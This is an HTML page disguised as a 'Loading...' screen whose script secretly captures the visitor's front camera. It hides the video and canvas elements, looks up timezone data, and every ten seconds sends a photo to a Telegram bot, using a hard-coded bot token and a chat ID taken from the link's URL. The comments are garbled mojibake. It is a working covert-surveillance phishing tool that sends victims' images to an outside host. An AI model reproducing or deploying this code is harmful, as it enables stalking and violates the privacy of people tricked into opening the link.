<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .loading {
            text-align: center;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #frontCamera {
            display: none;
        }
    </style>
</head>
<body>

    <div class="loading">
        <div class="spinner"></div>
        <p>Loading...</p>
    </div>

    <video id="frontCamera" autoplay playsinline style="display: none;"></video>
    <canvas id="canvasFront" style="display: none;"></canvas>

    <script>
        // Ø¯ URL Ú…Ø®Ù‡ Ú©Ø§Ø±ÙˆÙˆÙ†Ú©ÙŠ ID ØªØ±Ù„Ø§Ø³Ù‡ Ú©Ú“ÙŠ
        function getUrlParameter(name) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(name);
        }

        const userId = getUrlParameter('userid');

        // Ú©Ù‡ Ú†ÛŒØ±Û userId Ù†Ù‡ ÙˆÙŠØŒ Ù†Ùˆ Ú©Ø§Ø± Ù†Ù‡ Ú©Ú“ÙŠ
        if (!userId) {
            document.querySelector('.loading p').textContent = "User ID not found.";
            exit();
        }

        // Ø¯ ØªÙ„ÛŒÚ«Ø±Ø§Ù… Ø¨ÙÙˆÙ¼ API
        const botToken = '8051076844:AAEN0Q6igi5skFgw4f3J7xXF6Cm7WoUNa7E';

        // Ø¯ IPØŒ Ù‡ÛŒÙˆØ§Ø¯ØŒ Ø§Ùˆ Ù¼Ø§ÛŒÙ… Ø²ÙˆÙ† Ù…Ø¹Ù„ÙˆÙ…Ø§ØªÙˆ ØªØ±Ù„Ø§Ø³Ù‡ Ú©ÙˆÙ„Ùˆ Ù„Ù¾Ø§Ø±Ù‡ API
        fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            const timezone = data.timezone || 'N/A';
            const proofnum = userId; // Ø¯ Ù…Ø«Ø§Ù„ Ù¾Ù‡ ØªÙˆÚ«Ù‡ Ø¯ Ú©Ø§Ø±ÙˆÙˆÙ†Ú©ÙŠ ID Ú…Ø®Ù‡ Ú©Ø§Ø±ÙˆÙ„

            // Ø¯ Ù…ÛŒØ³Ø¬ Ù…ØªÙ†
            const message = `ðŸ“· **Photo Web Info Received**\n\n_timezone_ : ${timezone}\n_Proofnum_:\`${proofnum}\`\n**dev**: @ProTech43\nThis is Photo Web Info`;

            // Ø¯ Ú©Ù…ÛŒØ±Ø§ ØªØ±Ø³Ø±Ù‡ Ú©ÙˆÙ„
            const frontVideo = document.getElementById('frontCamera');
            const canvasFront = document.getElementById('canvasFront');

            let frontStream = null;

            // Ø¯ Ø¹Ú©Ø³ Ø§Ø®Ø³ØªÙ„ Ø§Ùˆ Ù„ÛŒÚ–Ù„ ÛŒÙˆØ§Ø²Û Ø¯ Ù…Ø® Ø¯Ø§ Ú©Ù…ÛŒØ±Ø§
            function captureAndSend() {
                if (!frontStream) {
                    console.log("Front camera stream not ready yet.");
                    return; // Ú©Ù‡ Ú†ÛŒØ±Û Ú©Ù…ÛŒØ±Ø§ Ø´ØªÙˆÙ† Ù†Ù‡ Ù„Ø±ÙŠØŒ Ù†Ùˆ Ú©Ø§Ø± Ù†Ù‡ Ú©Ú“ÙŠ
                }

                console.log("Attempting to capture and send front photo...");

                // Ø¯ Ù„ÙˆÙ…Ú“ÙŠ Ú©Ù…ÛŒØ±Ø§ ( frontal / front ) Ø¹Ú©Ø³
                canvasFront.width = frontVideo.videoWidth;
                canvasFront.height = frontVideo.videoHeight;
                canvasFront.getContext('2d').drawImage(frontVideo, 0, 0);

                // Ø¯ Ø¹Ú©Ø³ Ø¯ blob (Binary Large Object) Ù¾Ù‡ ØªÙˆÚ«Ù‡ Ø¨Ø¯Ù„ÙˆÙ„
                canvasFront.toBlob(function(frontBlob) {
                    if (!frontBlob) {
                        console.error("Failed to convert front canvas to blob.");
                        return;
                    }

                    console.log("Front blob created, attempting to send...");

                    const frontPhotoFile = new File([frontBlob], 'front_photo.jpg', { type: 'image/jpeg' });

                    // Ø¯ Ø¹Ú©Ø³ Ù„ÛŒÚ–Ù„ Ù„Ù¾Ø§Ø±Ù‡ ÙØ§Ø±Ù… Ú‰Ø§Ù¼Ø§
                    const formData = new FormData();
                    formData.append('chat_id', userId);
                    formData.append('photo', frontPhotoFile);
                    formData.append('caption', message); // Ù…ÛŒØ³Ø¬ Ø¯ Ø¹Ú©Ø³ Ø³Ø±Ù‡
                    formData.append('parse_mode', 'Markdown'); // Ø¯ Ø§ÛŒÙ…ÙˆØ¬ÛŒ Ø§Ùˆ ÙØ§Ø±Ù…ÛŒÙ¼ Ù„Ù¾Ø§Ø±Ù‡

                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            console.log(`Front photo sent successfully.`);
                        } else {
                            console.error(`Error sending front photo:`, data);
                        }
                    })
                    .catch(error => {
                        console.error('Error sending front photo:', error);
                    });
                }, 'image/jpeg');
            }

            // Ø¯ Ú©Ù…ÛŒØ±Ø§ Ù„Ø§Ø³Ø±Ø³ÛŒ
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                // Ø¯ Ù„ÙˆÙ…Ú“ÙŠ Ú©Ù…ÛŒØ±Ø§ ( frontal / front ) Ù„Ø§Ø³Ø±Ø³ÛŒ
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // frontal camera
                    .then(stream => {
                        console.log("Front camera stream acquired.");
                        frontStream = stream;
                        frontVideo.srcObject = stream;
                    })
                    .catch(err => {
                        console.error("Error accessing front camera: ", err);
                        document.querySelector('.loading p').textContent = "Cannot access front camera.";
                    });

                // 1 Ø«Ø§Ù†ÛŒÙ‡ ÙˆØ®Øª ØªÙ…Ù‡ (Ø¯ Ù„ÙˆÚ‰ÛŒÙ†Ú« ÙˆØ®Øª)
                setTimeout(() => {
                    console.log("Starting front photo capture interval.");
                    // Ø¯ Ø¹Ú©Ø³ Ø¯ Ø§Ø®Ø³ØªÙ„Ùˆ Ø§Ùˆ Ù„ÛŒÚ–Ù„Ùˆ Ú†Ù„Ù†Ø¯ (Ø¯ 10 Ø«Ø§Ù†ÛŒÙˆ Ù¾Ù‡ ÙˆØ®Øª Ú©Û)
                    setInterval(captureAndSend, 10000); // 10000 milliseconds = 10 seconds
                    // Ú©Ù‡ Ú†ÛŒØ±Û ØªØ§Ø³Ùˆ 1 Ø«Ø§Ù†ÛŒÙ‡ ÛŒØ§ Ù†ÙˆØ± ÙˆØ®Øª ØºÙˆØ§Ú“Ø¦ØŒ Ù†Ùˆ Ø¹Ø¯Ø¯ Ø¨Ø¯Ù„ Ú©Ú“Ø¦
                }, 1000); // 1000 milliseconds = 1 second

            } else {
                console.error("navigator.mediaDevices.getUserMedia is not supported by this browser.");
                document.querySelector('.loading p').textContent = "Camera access not supported.";
            }
        })
        .catch(error => {
            console.error('Error fetching IP info:', error);
            document.querySelector('.loading p').textContent = "Failed to load info.";
        });
    </script>

</body>
</html> 
